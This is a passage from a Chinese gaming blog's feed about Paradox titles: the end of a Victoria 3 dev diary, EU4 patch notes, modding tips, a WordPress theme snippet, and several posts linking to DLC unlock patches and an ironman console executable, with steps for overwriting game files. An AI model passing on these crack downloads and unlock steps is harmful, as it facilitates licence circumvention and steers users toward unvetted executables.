had no effect.</li><li>Fixed a bug where bankrolling pacts would be cancelled unexpectedly</li><li>Fixed a bug where new traits for characters were not updated until game reload</li><li>Fixed a bug where occupying a province with connection via strait to an isolated island could cause split occupation</li><li>Fixed an issue when after researching quinine colony progress speed wasn’t updated</li><li>Fixed a bug where countries without elections had no last reform date saved</li><li>add_pollution effect now displays correct amount of pollution</li><li>Characters in the “void” no longer gain skill traits over time</li><li>Turkestan now counts the state of Ili in the list of possible states to form Turkestan in</li><li>Releasing Transcaucasia no longer requires Yemen to be released</li><li>Removed duplicate modifiers for Livestock Ranch throughput modifiers</li><li>“Dangerous Equipment” and all other pm_events now have a five year cooldown</li><li>Option C of the “Kindly Burn this Letter” event no longer throws endless errors.</li><li>Removed NULL_OBJ from the name of goldrush.5</li><li>Sepoy Mutiny no longer leaves states unincorporated for the EIC once defeated</li><li>Sepoy Mutiny no longer results in the EIC having two annex wargoals</li><li>bic_breakup.1 event no longer fires every month when its conditions are satisfied</li><li>bic_breakup.1 event now properly switches the Devout to the Hindu Priesthood in the pan-nationalist option</li><li>Fixed several bugs in the Child Labour events</li><li>Resolved several issues in the Psychology event chain</li><li>Added missing icon to the Marginalized concept tooltip</li><li>Rhode Island forestry hub now has a name</li><li>Fixed an issue where the load savegame confirmation window would remain opened outside the load game view.</li><li>Fixed an issue with the Nicaragua, Tripoli and Cauca Treaty Ports not being properly defined</li><li>Fixed a bug where the Opium Wars victory event could display without a title</li><li>Fixed some instances in which tutorial lessons could end up referring to a null object</li><li>Fixed a bug where the custom German flags based on different unifiers would not work if NGF&#x2F;SGF was formed on the way to becoming Germany</li><li>italian_unification.1.b now uses the correct loc key</li><li>Fixed an issue that led to scope problems in expedition conclusion events</li></ul><p>And that’s it!</p><p>It should be pretty obvious at this point but most of Update 1.3 focuses on increasing both the complexity and your agency over your internal politics. Expect to be surprised by some of the situations that can arise from the interplay of the new Agitator, revolution, enactment, and petition mechanics, among other improvements and tweaks we’ve made! We can’t wait to see what political imbroglios that arise in your nations next Monday, and hear how you end up dealing with them.</p><p>Next week will likely be a brief dev diary from us, as we’ll be focusing our efforts on listening to feedback and planning the next update. As always you can find us on the <a href="https://forum.paradoxplaza.com/forum/forums/victoria-3.1095/">forum</a> and on the official Victoria 3 <a href="https://discord.com/invite/victoriagamepdx">Discord server</a>!</p><p>Last edited: Friday at 18:56</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> P社 </tag>
            
            <tag> 开发日志 </tag>
            
            <tag> 维多利亚3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【EU4】（EXE文件）铁人控制台，可做成就，适用于1.29至1.35任意版本</title>
      <link href="/7d449aff.html"/>
      <url>/7d449aff.html</url>
      
        <content type="html"><![CDATA[<p>铁人下能使用的工具很多人都分享了，但都需要下载Cheat egine 7.0以上的版本。而这个文件只需两步：①打开铁人模式②打开这个EXE文件后单击Enter键。</p><p>P.S. 最近试了下，1.35也能用，看来蠢驴没改变读入内存的逻辑，这样说不定下一个版本也能用。</p><p><a href="https://cdn.gjcloak.xyz/cloudreve/1/2023/05/18/1_20230518165651_EU4ConsolePatcher.rar">下载地址</a></p><p><a href="https://bbs.52pcgame.net/forum.php?mod=attachment&aid=MjUzNTIyfDlhZDU1NmRjOWVhOTZmNDJmNTk1MzY2OGVmZjhkZjE3fDE2ODQ0MDAxNzc=&request=yes&_f=.rar">备用地址</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 铁人控制台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【亲测有效】Europa Universalis IV 欧陆风云 4 DLC 解锁补丁 至 v.1.35 《统治》</title>
      <link href="/6b7ee142.html"/>
      <url>/6b7ee142.html</url>
      
        <content type="html"><![CDATA[<p><strong>适用版本:</strong><br>v.1.35 《统治》</p><p><strong>包含DLC:</strong><br>- 241360 &#x3D; Europa Universalis IV: 100 Years War Unit Pack<br>- 241361 &#x3D; Europa Universalis IV: Horsemen of the Crescent Unit Pack<br>- 241362 &#x3D; Europa Universalis IV: Winged Hussars Unit Pack<br>- 241363 &#x3D; Europa Universalis IV: Star and Crescent DLC<br>- 241364 &#x3D; Europa Universalis IV: American Dream DLC (Europa Universalis IV: American Dream)<br>- 241365 &#x3D; Europa Universalis IV: Purple Phoenix<br>- 241366 &#x3D; Europa Universalis IV: National Monuments<br>- 241367 &#x3D; Europa Universalis IV: Conquest of Constantinople Music Pack<br>- 241368 &#x3D; Europa Universalis IV: National Monuments II<br>- 241369 &#x3D; Europa Universalis IV: Conquest of Paradise (Expansion - Europa Universalis IV: Conquest of Paradise)<br>- 241370 &#x3D; Europa Universalis IV: Conquistadors Unit pack<br>- 241371 &#x3D; Europa Universalis IV: Native Americans Unit Pack<br>- 241372 &#x3D; Europa Universalis IV: Songs of the New World<br>- 241373 &#x3D; Europa Universalis IV: Songs of Yuletide<br>- 278710 &#x3D; Europa Universalis IV: Native Americans II Unit Pack<br>- 278711 &#x3D; Europa Universalis IV: Colonial British and French Unit Pack<br>- 278712 &#x3D; Europa Universalis IV: Muslim Advisor Portraits<br>- 279620 &#x3D; Europa Universalis IV: Wealth of Nations (Expansion - Europa Universalis IV: Wealth of Nations)<br>- 279621 &#x3D; Europa Universalis IV: Muslim Ships Unit Pack<br>- 279622 &#x3D; Europa Universalis IV: Trade Nations Unit Pack<br>- 279623 &#x3D; Europa Universalis IV: Res Publica (Expansion - Europa Universalis IV: Res Publica)<br>- 295220 &#x3D; Europa Universalis IV: Anthology of Alternate History<br>- 295221 &#x3D; Europa Universalis IV: Indian Subcontinent Unit Pack<br>- 295222 &#x3D; Europa Universalis IV: Indian Ships Unit Pack<br>- 304590 &#x3D; Europa Universalis IV: Wealth of Nations E-book<br>- 310030 &#x3D; Europa Universalis IV: Republican Music Pack (Skopje Sessions) (Europa Universalis IV: Republican Music Pack)<br>- 310031 &#x3D; Europa Universalis IV: Art of War (Expansion - Europa Universalis IV: Art of War)<br>- 310032 &#x3D; Europa Universalis IV: Evangelical Union Unit Pack<br>- 310033 &#x3D; Europa Universalis IV: Catholic League Unit Pack<br>- 310034 &#x3D; Europa Universalis IV: Songs of War Music Pack<br>- 327830 &#x3D; Europa Universalis IV: Guns, Drums and Steel Music Pack<br>- 327831 &#x3D; Europa Universalis IV: Art of War Ebook<br>- 338160 &#x3D; Europa Universalis IV: El Dorado (Expansion - Europa Universalis IV: El Dorado)<br>- 338161 &#x3D; Europa Universalis IV: El Dorado Content Pack (Content Pack - Europa Universalis IV: El Dorado)<br>- 338162 &#x3D; Europa Universalis IV: Guns, Drums and Steel Volume 2 (Europa Universalis IV: Guns, Drums and Steel Volume 2 Music Pack)<br>- 338163 &#x3D; Europa Universalis IV: Common Sense (Expansion - Europa Universalis IV: Common Sense)<br>- 354790 &#x3D; Europa Universalis IV: Women in History<br>- 373150 &#x3D; Europa Universalis IV: Common Sense Content Pack (Content Pack - Europa Universalis IV: Common Sense)<br>- 373160 &#x3D; Europa Universalis IV: Common Sense E-Book<br>- 373370 &#x3D; Europa Universalis IV: The Cossacks (Expansion - Europa Universalis IV: The Cossacks)<br>- 373380 &#x3D; Europa Universalis IV: The Cossacks Content Pack (Content Pack - Europa Universalis IV: The Cossacks)<br>- 373400 &#x3D; Europa Universalis IV: Sounds from the community - Kairis Soundtrack<br>- 414300 &#x3D; Europa Universalis IV: Catholic Majors Unit Pack<br>- 414301 &#x3D; Europa Universalis IV: Catholic Majors Unit Pack<br>- 415680 &#x3D; Europa Universalis IV: Sabaton Soundtrack<br>- 436120 &#x3D; Europa Universalis IV: Mare Nostrum (Expansion - Europa Universalis IV: Mare Nostrum)<br>- 436121 &#x3D; Europa Universalis IV: Mare Nostrum Content Pack (Content Pack - Europa Universalis IV: Mare Nostrum)<br>- 443720 &#x3D; Europa Universalis IV: Kairis Soundtrack Part II (Europa Universalis IV: Sounds from the community - Kairis Soundtrack Part II)<br>- 472030 &#x3D; Europa Universalis IV: Fredman’s Epistles<br>- 486570 &#x3D; Europa Universalis IV: Rights of Man (Expansion - Europa Universalis IV: Rights of Man)<br>- 486571 &#x3D; Europa Universalis IV: Rights of Man Content Pack (Content Pack - Europa Universalis IV: Rights of Man)<br>- 486970 &#x3D; Europa Universalis IV: Fredman’s Midsummer Epistles (Europa Universalis IV: Fredman’s Epistles)<br>- 487150 &#x3D; Europa Universalis IV: Songs of Regency<br>- 538020 &#x3D; Europa Universalis IV: Mandate of Heaven (Expansion - Europa Universalis IV: Mandate of Heaven)<br>- 538021 &#x3D; Europa Universalis IV: Mandate of Heaven Content Pack (Content Pack - Europa Universalis IV: Mandate of Heaven)<br>- 539260 &#x3D; Europa Universalis IV: Evangelical Majors Unit Pack<br>- 617960 &#x3D; Europa Universalis IV: Ultimate Music Pack (Collection - Europa Universalis IV: Ultimate Music Pack)<br>- 617961 &#x3D; Europa Universalis IV: Ultimate E-book Pack (Collection - Europa Universalis IV: Ultimate E-book Pack)<br>- 617962 &#x3D; Europa Universalis IV: Early Upgrade Pack (Collection - Europa Universalis IV: Early Upgrade Pack)<br>- 625050 &#x3D; Europa Universalis IV: Third Rome<br>- 625170 &#x3D; Europa Universalis IV: Call-to-Arms Pack<br>- 625171 &#x3D; Europa Universalis IV: Digital Extreme Edition Upgrade Pack<br>- 625172 &#x3D; Europa Universalis IV: Pre-Order Pack<br>- 642780 &#x3D; Europa Universalis IV: The Rus Awakening<br>- 721340 &#x3D; Europa Universalis IV: Cradle of Civilization (Expansion - Europa Universalis IV: Cradle of Civilization)<br>- 721341 &#x3D; Europa Universalis IV: Cradle of Civilization Content Pack (Content Pack - Europa Universalis IV: Cradle of Civilization)<br>- 760070 &#x3D; Europa Universalis IV: Rule Britannia<br>- 768340 &#x3D; Europa Universalis IV: Monuments to Power Pack (Collection - Europa Universalis IV: Monuments to Power Pack)<br>- 827240 &#x3D; Europa Universalis IV: Dharma (Expansion - Europa Universalis IV: Dharma)<br>- 827250 &#x3D; Europa Universalis IV: Dharma Content Pack (Content Pack - Europa Universalis IV: Dharma)<br>- 834360 &#x3D; Europa Universalis IV: Ultimate Unit Pack (Collection - Europa Universalis IV: Ultimate Unit Pack)<br>- 957010 &#x3D; Europa Universalis IV: Dharma Collection - Terminating 103673<br>- 960850 &#x3D; Europa Universalis IV: Test 6<br>- 960920 &#x3D; Europa Universalis IV: Golden Century (Immersion Pack - Europa Universalis IV: Golden Century)<br>- 1009630 &#x3D; Europa Universalis IV: Imperator Unit Pack<br>- 1259360 &#x3D; Europa Universalis IV: Emperor (Expansion - Europa Universalis IV: Emperor)<br>- 1264340 &#x3D; Europa Universalis IV: Emperor Content Pack (Content Pack - Europa Universalis IV: Emperor)<br>- 1416420 &#x3D; Europa Universalis IV: Leviathan (Expansion - Europa Universalis IV: Leviathan)<br>- 1756130 &#x3D; Europa Universalis IV: Origins<br>- 2012010 &#x3D; Europa Universalis IV: Lions of the North<br>- 1896050 &#x3D; Europa Universalis IV - Expansion Subscription<br>- 2350610 &#x3D; SteamDB Unknown App 2350610<br>- 2329860 &#x3D; SteamDB Unknown App 2329860<br>- 2223660 &#x3D; Europa Universalis IV: Domination<br>- 1756190 &#x3D; Europa Universalis IV: Guns, Drums and Steel Volume 3</p><p><strong>使用方法：</strong></p><p>- 把 DLC 文件下载覆盖到游戏目录的 game&#x2F;dlc ；<br>- 把 cream_api 解锁补丁文件下载覆盖到 游戏根目录以及 binaries文件；<br>- 还有 Launcher  文件夹覆盖 *&#x2F;Users&#x2F;用户名&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Paradox Interactive&#x2F;launcher&#x2F; (不是必须步骤，如果启动器不能识别再操作)。</p><p><strong>下载：</strong></p><p>Paradox Interactive</p><p><a href="https://pan.quark.cn/s/c00cac5f62ac">下载</a></p><p>备用地址1</p><p><a href="https://juij.eu.org/#Paradox%20Interactive">https://juij.eu.org/#Paradox%20Interactive</a></p><p>备用地址2</p><p><a href="https://juij.pro/#Paradox%20Interactive">https://juij.pro/#Paradox%20Interactive</a></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> dlc </tag>
            
            <tag> Europa Universalis IV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【心得】实用改派【伟大建筑】【附庸不独立】【其他小细节】</title>
      <link href="/8be17afb.html"/>
      <url>/8be17afb.html</url>
      
        <content type="html"><![CDATA[<p>反正我自己用的 就当做个发掘小备忘录</p><p>[hidecontent type&#x3D;”reply” desc&#x3D;”隐藏内容：评论后查看”]</p><p>Europa Universalis IV\common\great_projects下面的01号文件修改伟大建筑。<br>forbidden_city是紫禁城，<br>        can_use_modifiers_trigger &#x3D; {<br> }  </p><p> can_upgrade_trigger &#x3D; {<br> }<br>以上是有效触发和建造升级都无条件<br>reduced_liberty_desire &#x3D; 100 附庸国独立意愿降低100%<br>defines文件的编辑：<br>MAX_CHRISTIAN_RELIGIOUS_CENTERS &#x3D; 3 改革中心最大数量<br>MAX_RELIGIOUS_CENTER_SPREAD_DISTANCE &#x3D; 150.0 改革中心最大不超过的传播距离<br>REVOLUTION_SPREAD_COUNT &#x3D; 3 革命中心一次传播革命最大省份数量</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 改派 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> P社 </tag>
            
            <tag> 心得 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>群星3.8.1 全dlc文件+解锁补丁 （正版用）</title>
      <link href="/8c73be6d.html"/>
      <url>/8c73be6d.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-14-1024x576.png"></p><p>给steam本体用的，解压覆盖本地文件就OK~</p><p><a href="https://pan.baidu.com/s/1_kBxu0z5-TDiDnvHJff94w">链接</a> 提取码:zy9e</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 补丁 </tag>
            
            <tag> steam </tag>
            
            <tag> P社 </tag>
            
            <tag> 群星 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【改(狂)派】教你如何爽拔领地，阶层还得感恩戴德</title>
      <link href="/f32244a7.html"/>
      <url>/f32244a7.html</url>
      
        <content type="html"><![CDATA[<!-- wp:paragraph --></p><p>收了阶层领地，他们还得谢谢咱😆</p><p><!-- /wp:paragraph --><p></p><p></p><!-- wp:image {"id":1899,"sizeSlug":"full","linkDestination":"none"} --></p><figure class="wp-block-image size-full"><img class="wp-image-1899" src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-12.png" alt="" /></figure><p><!-- /wp:image --><p></p><p></p><!-- wp:zibllblock/hide-content --></p><div class="wp-block-zibllblock-hide-content" data-type="reply"><p>[hidecontent type="reply"]<!-- wp:paragraph {"textColor":"vivid-red"} --></p><p class="has-vivid-red-color has-text-color"><span style="color: #ff0000;"><strong>想要改回原数值，记得备份下原文件</strong></span></p><p><!-- /wp:paragraph --></p><p><!-- wp:paragraph --></p><p>先到这个地址 <span style="color: #0000ff;"><strong>Europa Universalis IV\common\estate_crown_land </strong></span>找到 <span style="color: #0000ff;"><strong>00_interactions.txt</strong></span> 文档打开<br />直接搜索<span style="color: #ff0000;"><strong>-20</strong></span>把负号删掉就行，上面还有个<span style="color: #ff0000;"><strong>-15</strong></span>也改掉，也可以修改数值，这里就是拔地影响的忠诚度</p><p><!-- /wp:paragraph --></p><p><!-- wp:paragraph --></p><p>什么还不够爽？继续在文档里搜索“ <span style="color: #0000ff;"><strong>key =</strong></span>”会出现 <span style="color: #0000ff;"><strong>sale_of_titles/summon_the_diet/seize_land </strong></span>分别对应<strong>卖地，开会，拔地</strong></p><p>底下对应的的 <strong><span style="color: #0000ff;">cooldown_months = 60</span> </strong>就是冷却时间默认60个月，改成0就可以无CD操作，专制前100领地特权拉满，专制开始时也能配合卖地特权迅速撤销</p><p><!-- /wp:paragraph --></p><p><!-- wp:paragraph --></p><p><!-- /wp:paragraph --></p><p><!-- wp:paragraph --></p><p>后来我又觉得太狂了XD，想了个折中的改法（<br /><span style="color: #ff0000;"><strong>Europa Universalis IV\common\government_reforms </strong></span>先到这个地址，01到04分别是君主，共和，神权，部落，打开这4个文档后找到 <strong><span style="color: #0000ff;">custom_attributes = {</span> </strong>在这个值的括弧里添加一行 <strong><span style="color: #0000ff;">seizing_land_no_rebels = yes</span> </strong>这样忠诚扣到30以下就不会爆叛军了，再也不用受林登万的鸟气了！</p><p><!-- /wp:paragraph --></p><p><!-- wp:image {"id":1900,"sizeSlug":"full","linkDestination":"none"} --></p><figure class="wp-block-image size-full"><img class="wp-image-1900" src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-13.png" alt="" /></figure><p><!-- /wp:image --></p><p><!-- wp:paragraph --></p><p>底下再附一些我常用的修改项<br /><span style="color: #ff0000;"><strong>Europa Universalis IV\common</strong></span> 这个地址下的 <span style="color: #ff0000;"><strong>defines.lua</strong></span><br />打开后搜索：<br /><span style="color: #0000ff;"><strong>POWER_MAX = 999</strong></span>（最大点数修改，我现在就凑1000整图好康了，点数富裕的时候还能存下来很变态）<br /><span style="color: #0000ff;"><strong>MONTHS_TO_CHANGE_CULTURE = 10</strong></span> （转变文化时每点发展度所需要消耗的月数，可以改小数点，我就改成了1月，图图起来很爽）<br /><strong><span style="color: #0000ff;">PS_CHANGE_CULTURE = 10</span> </strong>（转变文化时每点发展度所需要的点数，这个我没改，不然图起来太哈人了）</p><p><!-- /wp:paragraph -->[/hidecontent]</p></div><p><!-- /wp:zibllblock/hide-content --><p></p><p></p><!-- wp:paragraph --></p><p>带mod做成就的ce文件也适用于上面的修改，别忘记先开ce再打开铁人存档<br />大型内容mod应该都适用于上面的改法，地址只是EU4主文件夹换到mod主文件夹下</p><p><!-- /wp:paragraph --><p></p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 改派 </tag>
            
            <tag> 欧陆风云4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文章列表右上角添加文章置顶和新文章发布图标</title>
      <link href="/1867.html"/>
      <url>/1867.html</url>
      
        <content type="html"><![CDATA[<p>先看效果图</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-6.png"></p><p>在子比主题目录下“func.php”(子比主题推荐放这里）或者“functions.php”，在合适位置放下面PHP代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* 新文章发布New小图标</span><br><span class="line">*/</span><br><span class="line">function tianyishangke_post_newicon($post)&#123;</span><br><span class="line">    //date_default_timezone_set(&#x27;PRC&#x27;);</span><br><span class="line">    $wiui_date = date(&quot;Y-m-d H:i:s&quot;);</span><br><span class="line">    $wiui_post_date = get_the_time(&#x27;Y-m-d H:i:s&#x27;, $post);</span><br><span class="line">    $wiui_diff = (strtotime($wiui_date)-strtotime($wiui_post_date))/3600;</span><br><span class="line">    if($wiui_diff&lt;24)&#123;</span><br><span class="line">        $wiui_new_icon = &#x27;&lt;div class=&quot;tianyishangke-new-icon&quot;&gt;&lt;img src=&quot;图标链接&quot; draggable=&quot;false&quot; alt=&quot;最新文章&quot; /&gt;&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;else if (is_sticky())&#123;</span><br><span class="line">        $wiui_new_icon = &#x27;&lt;div class=&quot;tianyishangke-new-icon&quot;&gt;&lt;img src=&quot;图标链接&quot; draggable=&quot;false&quot; alt=&quot;置顶文章&quot; /&gt;&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $wiui_new_icon = &#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    //开始输出</span><br><span class="line">    return $wiui_new_icon;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在子比主题目录下“&#x2F;zibll&#x2F;inc&#x2F;functions&#x2F;zib-posts-list.php”文件中，放在获取文章列表标题内 大概440行的文章放入下面PHP代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$html .= tianyishangke_post_newicon($post);//置顶文章icon图标函数</span><br></pre></td></tr></table></figure><p>最后在自定义css代码里面添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*新文章发布图标样式*/</span><br><span class="line">.posts-item&#123;position: relative !important;&#125;</span><br><span class="line">.tianyishangke-new-icon&#123;position: absolute;height: 35px;right: 0;top: 0;&#125;</span><br><span class="line">.tianyishangke-new-icon img&#123;-webkit-user-drag: none;&#125;</span><br></pre></td></tr></table></figure><p>这样就可以了</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 分享 </tag>
            
            <tag> 子比主题 </tag>
            
            <tag> 子比美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Victoria 3 维多利亚3 DLC文件 &amp; 解锁补丁 至 v1.3.* 《人民之声》</title>
      <link href="/9b09f0a.html"/>
      <url>/9b09f0a.html</url>
      
        <content type="html"><![CDATA[<p><strong>适用版本:</strong><br>- v1.3.* 至最新《Voice of the People 人民之声》</p><p><strong>包含DLC:</strong><br>2071470 &#x3D; Victoria 3: Victoria II Remastered Songs （预购）<br>2071471 &#x3D; Victoria 3: American Building Pack （预购）<br>2282100 &#x3D; Victoria 3: Voice of the People<br>2348450 &#x3D; Victoria 3: Melodies for the Masses Music Pack</p><p><strong>使用方法：</strong></p><p>- DLC 文件覆盖到游戏目录 `game` （一般情况下，不是跨大版本更新的话，DLC 文件都是可以通用）<br>- 解锁补丁文件覆盖游戏目录 `binaries`<br>- 备用选项：<br>  - 解锁补丁文件覆盖 `*&#x2F;Users&#x2F;用户名&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Paradox Interactive&#x2F;launcher&#x2F;` (不是必须步骤，如果游戏内不能启用 DLC 再尝试操作)</p><p><a href="https://pan.quark.cn/s/1dc74f9219db">下载地址1</a> <a href="https://pan.quark.cn/s/93468a7b6534">下载地址2</a> </p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dlc </tag>
            
            <tag> 维多利亚3 </tag>
            
            <tag> VIC3 </tag>
            
            <tag> 人民之声 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Europa Universalis IV: Patch 1.35.3 is Now Live! Checksum [f6b8] - Not For Problem Reports!</title>
      <link href="/1959.html"/>
      <url>/1959.html</url>
      
        <content type="html"><![CDATA[<p>Greetings everyone!</p><p>Today we released patch 1.35.3 for Europa Universalis IV! This is just a hotfix for an issue introduced with yesterday’s 1.35.2 patch and contains only one thing, which is why I combine the 1.35.2 patchnotes with this.</p><p>As always, please report any issues in our <a href="https://forum.paradoxplaza.com/forum/index.php?forums/euiv-bug-reports.813/">bug report forum</a> or submit a <a href="https://support.paradoxplaza.com/">support ticket</a>. Thank you!</p><p>#############################################################<br>######################## 1.35.3 ###############################<br>#############################################################</p><p>###################<br># Bugfixes<br>###################<br>- Yangtze river flood event doesn´t add devastation to all owned provinces anymore</p><p><strong>PLEASE NOTE!</strong><br>There is still an issue with the Yangtze River Flood” Event, which causes it to effect all provinces along the River, even if below 15 Development. This issue occurs after completion of the missions “Tame China’s Sorrow” and “The Jing Hang Grand Canal” - we’re working towards a fix for this as well. Our apologies for the inconvenience caused.</p><p>#############################################################<br>######################## 1.35.2 ###############################<br>#############################################################</p><p>###################<br># Gamebalance<br>###################</p><p># Governments<br>- The government reform “French Feudalism” no longer needs 50% of Crownland to integrate subjects. Instead, the “Seize Land” effect has now a counter which allows you to start the integration of an appanage. In other words: to integrate Orleans you would need to seize land and start the integration. For integrating Armagnac you would have to seize land again. You can save up the seize land charges so you can integrate all appanages later at the same time.<br>- Modernization has now a base decay of 0.3 per month.<br>- Increased the yearly manpower gain from the “Mobilize New Order Regiments” interaction from 0.3 to 0.75 for the Russian Empire and its republican equivalent.<br>- Increased the yearly manpower gain from the “Equip Streltsy” interaction from 0.2 to 0.3 for the Russian Principality and from 0.1 (which was a number bug) to 0.6 Years of Manpower.<br>- The elective monarchy is now mutually exclusive with States General</p><p># Other<br>- The decadence mission “End the Eyalet Rebellions” now requires you to have 70 Absolutism if you are in the Age of Absolutism or Revolutions. “The Eyalet Rebellion” will now remove 100 Absolutism when fired.<br>- Added an alternative trigger to the decadence disaster “Restructure Administration” which no longer forces you to have 2 Admin Idea Groups filled to complete this mission.<br>- The decadence disaster “End the Eyalet Rebellion” will now request 60 provinces in the Europe continent instead of 50 in Western Europe specifically.<br>- The Plot of the Harem disaster no longer reduces the stats of your heirs by 1&#x2F;1&#x2F;1.<br>- The decadence event “Corruption of the Court” now costs 0.1 years of income instead of 0.2.<br>- The mission reward of the decadence mission “The Eyalet Crisis” now lasts for 30 years instead of 19750 days.<br>- The decadence mission “Handle the Janissaries” no longer requires you to make 9 Mil power per month.<br>- Severely tuned down the Janissaries spawned from events of the Janissary Coup disaster.<br>- Eyalets now count as your border, meaning you can core provinces next to them.<br>- Missions that require you to have some idea groups of a category filled out have now alternatives. Also decreased the number of needed military and admin idea groups from 3&#x2F;2 to 2&#x2F;1 idea groups needed.<br>- The Janissary Coup disaster now increases the Janissary Influence by 10% instead of 30% and Janissary Max Privileges by 3. It no longer decreases the Loyalty Equilibrium.<br>- The events of the Internal Power Struggle disaster now have a lower increase of their penalties. Additionally, they no longer decrease the stability to their fullest strength.<br>- The estate privileges for the Janissaries from the Janissary Coup disaster now increase influence by 10% instead of 20%.<br>- The English Parliament Issue “Army Reform Acts” increases Army Tradition by 5 and Army Professionalism by 0.5% instead of 15 and 1% respectively.<br>- The English Parliament Issue “Man-of-War Acts” increases Navy Tradition by 5 instead of 15.<br>- The English Parliament Issue “Maritime Discipline Acts” adds 20 Military Power instead of 50.<br>- The English Parliament Issue “The Black Act” will now increase stability by 1 instead of 3.<br>- Restored Siamese ideas partially. They have their old traditions and ambition back as well as their cavalry combat ability.<br>- Takeda ideas now grant proper Army Professionalism.<br>- Restored Siamese ideas partially. They have their old traditions and ambition back as well as their cavalry combat ability.<br>- Eyalets and Core Eyalets have now -5k Manpower and -5 Land Force Limit to reduce the benefits from having a high quantity of low development Eyalets.</p><p>###################<br># Interface<br>###################</p><p># Country<br>- Fars is now pink.</p><p># Icons<br>- Thalassocracy (Government Reform) now has a proper icon.</p><p># Unitmodels<br>- Fixed typo in country colors that turned a lot of country unit models white. (Thanks for finding the solution <a href="https://forum.paradoxplaza.com/forum/members/540184/">@Gunthah</a>)</p><p># Tooltips<br>- Benefits from Celestial reforms no longer have a blank name in the country modifiers tab.<br>- Fixed a tooltip error in the mission “Shield of Outremer”<br>- Fixed an error that prevented the Divine Empire of Japan from granting the appropriate title of ‘Tenno’ to its rulers</p><p># Other<br>- Fixed a typo in the description of the Portuguese achievement ‘The Navigator’.</p><p>###################<br># Script<br>###################<br># Achievements<br>- Fixed an issue that prevented the Forever Golden Achievement from being displayed as available to Castile for Golden Century or Domination owners<br>- Aragonese missions are now properly cataloged towards the Forever Golden Achievement<br>- The Achievement ‘Big Blue Blob’ now correctly highlights all non-French provinces in Europe<br>- Fixed a few localization and requirement minor issues with 1.35 Achievements<br>- Spain can now be diplomatically formed via 90 Republican Tradition or 100 Devotion so Aragon as a Peasant Republic can form it diplomatically.</p><p># Decisions<br>- Forming England will now grant you the English Monarchy as long your tier 1 is not locked &#x2F; your government is not locked.<br>- The decision to form the Angevin Kingdom no longer requires you to have 25 provinces in the French region.<br>- Forming Siam through the decision now requires Administrative Technology 20.</p><p># Events<br>- Made the Yellow and Yangtze River floods less punishing.<br>- English&#x2F;British flavor events can now fire for the Angevin Kingdom too.<br>- A Question of Faith event will no longer fire during the Shinto Christianity Incident.<br>- The event ‘Question of Faith’ will also not fire during the Ikko Ikko and Neo-Confucianism incidents.<br>- Hungary now has to be an independent country to be forced into a personal union under Austria.<br>- Elective Monarchies now look for a Christian noble when the country is Christian itself. In other words, the House of Osman will no longer claim the Czech throne.<br>- The Ottoman event ‘The Ottoman Line of Succession’ will now fire less frequently if you have already had this event with the same heir and will reduce its maluses for recurring instances of the event for the second option<br>- Made it so if you choose to convert to Christianity via the Shinto incident event chain, you will always get the full Christian outcome (Land of the Christian Sun)<br>- Revolutionary France will now properly be able to choose regarding the adoption of new national ideas upon embracing the Revolution in the event “The Storming of Bastille”<br>- The Golden Bull Treaty event which subjugates the Pope for France, now also sets the Pope to start with much less Liberty Desire to account for Liberty Desire from Development<br>- The event “Election of a New Ruler” for Elective Monarchies will now remove the heir if you decide to not elect your current ruler&#x2F;heir.</p><p># Missions<br>- The Qing mission ‘Ten Grand Campaigns’ now grants the necessary claims in the Burma region<br>- Added proper highlighting for the Lower 